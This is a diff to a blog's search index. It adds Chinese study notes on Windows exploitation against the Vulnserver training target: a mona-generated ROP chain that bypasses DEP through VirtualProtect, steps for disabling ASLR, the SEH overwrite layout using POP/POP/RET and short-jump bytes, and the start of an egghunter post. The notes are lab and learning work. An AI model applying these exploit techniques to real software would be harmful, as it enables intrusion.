@@ -1403,8 +1403,17 @@
 <p>在寻找<code>ROP gadget</code>的时候一般会用到<code>rp++</code>，但是在<code>GitHub</code>上编译好的是<code>64</code>位的，所以这里需要自己手动编译。因为我已经安全好<code>VS2019 x86</code>版本，所以想着自带的<code>cmake</code>能够直接用，结果出现与<code>win10 21h2 32</code>位版本不兼容的情况。解决办法就是下载<code>cmake-3.22.2-i386</code>版本（这里我选择了一个当前稳定版里面的最高版，其他版本未测），安装覆盖<code>VS2019</code>自己安装的<code>cmake</code>文件即可。</p>
 <p>这里，还有一点需要注意的。必须关闭系统的ASLR。以<code>Win7</code>为例，修改注册表，找到项<code>[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management]</code>，创建一个新的值：名字为：<code>MoveImages</code>，类型为：<code>DWORD</code>，值为：<code>00000000</code>。</p>
 <p>不同系统关闭<code>ASLR</code>的办法参照：<a href="https://rehex.ninja/posts/disable-aslr/" target="_blank" rel="noopener">https://rehex.ninja/posts/disable-aslr/</a></p>
-<p><code>win10 21h2 x86</code>下面，<code>rp-win-x86</code>获取的<code>rop gadget</code>地址不对，和<code>mona</code>获取的<code>rop</code>链对应模块的地址差别很大。<code>rp 2.0</code>以上版本增加了<code>--va</code>参数，可以加上这个参数获取<code>rop gadget</code>相对模块基地址的偏移。然后在<code>immunity debugger</code>中获取模块加载时的基地址，两者相加得到<code>rop gadget</code>的地址。</p>
-<p>rop链的理解：通过对栈指针和寄存器的操作，达到对特定函数的调用、shellcode的执行。</p>
+<p><code>win10 21h2 x86</code>下面，<code>rp-win-x86</code>获取的<code>rop gadget</code>地址不对，和<code>mona</code>获取的<code>rop</code>链对应模块的地址差别很大。<code>rp 2.0</code>以上版本增加了<code>--va</code>参数，可以加上这个参数获取<code>rop gadget</code>相对模块基地址的偏移。然后在<code>immunity debugger</code>中获取模块加载时的基地址，两者相加得到<code>rop gadget</code>的地址。或者，查看<code>mona</code>生成<code>rop</code>链的时候，会同时生成一个<code>rop.txt</code>文件，看里面的<code>rop gadget</code>也可，地址和<code>immunity debugger</code>中是一一对应的。</p>
+<p><code>rop</code>链的理解：通过对栈指针和寄存器的操作，不断改变执行流，达到对特定函数的调用、<code>shellcode</code>的执行。</p>
+<p>在<code>win10 21h2 32</code>构造的不顺利，也想开始有两个寄存器来保存<code>ESP</code>的值，后续方便操作。但是在所有<code>rop gadget</code>里面没有找到合适的。其实有个方便的方式，参考<code>mona</code>生成的基于<code>virtualprotect</code>函数的<code>rop</code>链模板，自己在<code>rop gadget</code>里面寻找合适的即可。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">*** [ Python ] ***</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">create_rop_chain</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># rop chain generated with mona.py - www.corelan.be</span></span><br><span class="line">    rop_gadgets = [</span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_esi:---]</span></span><br><span class="line">      <span class="number">0x755fc77e</span>,  <span class="comment"># POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x6250609c</span>,  <span class="comment"># ptr to &amp;VirtualProtect() [IAT essfunc.dll]</span></span><br><span class="line">      <span class="number">0x76b86a56</span>,  <span class="comment"># MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x775e60d3</span>,  <span class="comment"># XCHG EAX,ESI # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebp:---]</span></span><br><span class="line">      <span class="number">0x7560e8fc</span>,  <span class="comment"># POP EBP # RETN [KERNELBASE.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x625011af</span>,  <span class="comment"># &amp; jmp esp [essfunc.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ebx:---]</span></span><br><span class="line">      <span class="number">0x755c37e2</span>,  <span class="comment"># POP EAX # RETN [KERNELBASE.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0xfffffdff</span>,  <span class="comment"># Value to negate, will become 0x00000201</span></span><br><span class="line">      <span class="number">0x7669236e</span>,  <span class="comment"># NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x76a87926</span>,  <span class="comment"># XCHG EAX,EBX # RETN [msvcrt.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edx:---]</span></span><br><span class="line">      <span class="number">0x775b422d</span>,  <span class="comment"># POP EAX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0xffffffc0</span>,  <span class="comment"># Value to negate, will become 0x00000040</span></span><br><span class="line">      <span class="number">0x76693798</span>,  <span class="comment"># NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x7754f292</span>,  <span class="comment"># XCHG EAX,EDX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_ecx:---]</span></span><br><span class="line">      <span class="number">0x77638d70</span>,  <span class="comment"># POP ECX # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x62504c95</span>,  <span class="comment"># &amp;Writable location [essfunc.dll]</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_edi:---]</span></span><br><span class="line">      <span class="number">0x775d77a3</span>,  <span class="comment"># POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x7669379a</span>,  <span class="comment"># RETN (ROP NOP) [KERNEL32.DLL] ** REBASED ** ASLR</span></span><br><span class="line">      <span class="comment">#[---INFO:gadgets_to_set_eax:---]</span></span><br><span class="line">      <span class="number">0x76692c45</span>,  <span class="comment"># POP EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR </span></span><br><span class="line">      <span class="number">0x90909090</span>,  <span class="comment"># nop</span></span><br><span class="line">      <span class="comment">#[---INFO:pushad:---]</span></span><br><span class="line">      <span class="number">0x76ac6f67</span>,  <span class="comment"># PUSHAD # RETN [msvcrt.dll] ** REBASED ** ASLR </span></span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(struct.pack(<span class="string">'&lt;I'</span>, _) <span class="keyword">for</span> _ <span class="keyword">in</span> rop_gadgets)</span><br><span class="line"></span><br><span class="line">  rop_chain = create_rop_chain()</span><br></pre></td></tr></table></figure>
+
+<p>以上是mona自动生成的rop链，注意其中的<code>0x62504c95,  # &amp;Writable location [essfunc.dll]</code>。查看模块的地址可以发现，这个地址是<code>essfunc.dll</code>中<code>bss</code>段（可读可写）所在位置。</p>
+<p><img src="/2022/02/24/Vulnserver-TRUN-Bypass-DEP-With-ROP-Again/rop1.png" alt="vulnserver"></p>
+<p>仔细看这个<code>1000h</code>的空间，找一块没有使用的空间存放<code>shellcode</code>即可。所以可写地址不一定需要是<code>mona</code>生成的那样，可以自己指定其他的，如<code>62504210</code>。</p>
+<p>在<code>win 7 sp1 32</code>位和<code>win10 21h2 32</code>位都进行了手动构造<code>rop</code>链的实验。<code>win7 sp1 32</code>位构造的还算顺利。为加深印象，一步一步来构造整个<code>rop</code> 链。</p>
+<p>最后自己的构造的如下所示：</p>
+<p><strong>参考：</strong><a href="https://connormcgarr.github.io/ROP/" target="_blank" rel="noopener">https://connormcgarr.github.io/ROP/</a></p>
 ]]></content>
       <categories>
         <category>Windows Exploitation</category>
@@ -1414,6 +1423,47 @@
         <tag>Stack Based Overflows</tag>
         <tag>DEP</tag>
         <tag>ROP</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SEH Overflow Introduction</title>
+    <url>/2022/03/03/SEH-Overflow-Introduction/</url>
+    <content><![CDATA[<p>做一点小笔记，加深印象。<code>SEH Stack Overflow</code>的利用，需要理解<code>SEH</code>的原理，理解原理之后，才会明白<code>POP/POP/RET</code>结构的必要性。</p>
+<p><strong>SEH Introduction</strong></p>
+<p><a href="https://www.exploit-db.com/docs/english/17505-structured-exception-handler-exploitation.pdf" target="_blank" rel="noopener">Structured Exception Handler EXPLOITATION</a></p>
+<p><strong>POP POP RET</strong></p>
+<p><a href="https://dkalemis.wordpress.com/2010/10/27/the-need-for-a-pop-pop-ret-instruction-sequence/" target="_blank" rel="noopener">The need for a POP POP RET instruction sequence</a>上文提到<code>POP/POP/RET</code>的必要性，其中解释的时候Figure3所显示栈空间布局，<code>ESP</code>所指地址空间为何是那样的，主要涉及到返回值为<code>EXCEPTION_DISPOSITION</code>的回调函数在在栈空间的分布的问题。异常发生后，会在栈上划出一块区域，分配给如下所示的回调函数，<code>ESP</code>指向回调函数所分配栈空间的最上面。回调函数如下所示：可参考<br><a href="https://www.cnblogs.com/awpatp/archive/2010/06/15/1758763.html" target="_blank" rel="noopener">A Crash Course on the Depths of Win32 Structured Exception Handling 翻译版</a><br><a href="https://www-user.tu-chemnitz.de/~heha/hsn/chm/Win32SEH.chm/" target="_blank" rel="noopener">A Crash Course on the Depths of Win32 Structured Exception Handling</a></p>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">EXCEPTION_DISPOSITION</span><br><span class="line">__cdecl _except_handler(</span><br><span class="line">    struct _EXCEPTION_RECORD *ExceptionRecord,</span><br><span class="line">    <span class="keyword">void</span> * EstablisherFrame,</span><br><span class="line">    struct _CONTEXT *ContextRecord,</span><br><span class="line">    <span class="keyword">void</span> * DispatcherContext</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+
+<p><code>shellcode</code>结构如下所示：</p>
+<p><strong>参考:</strong><a href="https://www.corelan.be/index.php/2009/07/25/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-3-seh/" target="_blank" rel="noopener">Exploit writing tutorial part 3 : SEH Based Exploits</a></p>
+<p><img src="/2022/03/03/SEH-Overflow-Introduction/ppr.png" alt="seh"></p>
+<p>在这里解释一下：</p>
+<p>（1）当异常发生的时候，首先调到<code>SEH</code>链中第一个异常处理的<code>SE Handler</code>部分进行异常处理，在这里需要覆盖一个地址，使其指向<code>POP/POP/RET</code>指令所在的位置。至于为什么要用<code>P/P/R</code>指令，可以参照如下所示：</p>
+<p><img src="/2022/03/03/SEH-Overflow-Introduction/ppr2.png" alt="seh">当异常发生的时候，<code>ESP</code>的位置，现在需要使用<code>P/P/R</code>指令让<code>EIP</code>指向<code>EstablisherFrame</code>所在的地址，这样就可以指向<code>SEH</code>调用链了。</p>
+<p>（2）第一步完成之后，<code>EIP</code>指向<code>SEH</code>调用链第一个异常处理结构的<code>Next SEH</code>部分。这里存放一个跳转指定，让其跳过其后面紧跟的<code>SEH Handler</code>部分，<code>JMP</code>指令占两个字节，需要跳过六个字节，这里可以使用<code>\xEB\x06\x90\x90</code>来覆盖<code>Next SEH</code>部分的内容</p>
+<p>（3)第二步的跳转执行完之后，直接来到的<code>shellcode</code>所在的部分，进而完成利用。</p>
+]]></content>
+      <categories>
+        <category>Windows Exploitation</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Stack Based Overflows</tag>
+        <tag>SEH</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnserver GTER Exploit with Egghunter</title>
+    <url>/2022/03/01/Vulnserver-GTER-Exploit-with-Egghunter/</url>
+    <content><![CDATA[<p>获取系统调用号一般可以查询<a href="https://github.com/j00ru/windows-syscalls" target="_blank" rel="noopener">windows-syscalls</a>，或者自己用<code>windbg</code>进行查看。采用基于<code>NtDisplayString</code>的<code>egg hunter</code>代码块，因为不同版本操作系统的<code>NtDisplayString</code>系统调用号不一样，所以<code>egg hunter</code>代码块需要做一些修改。先来看下在<code>windbg</code>下如何获取<code>NtDisplayString</code>的系统调用号。</p>
+]]></content>
+      <categories>
+        <category>Windows Exploitation</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>Stack Based Overflows</tag>
       </tags>
   </entry>
 </search>
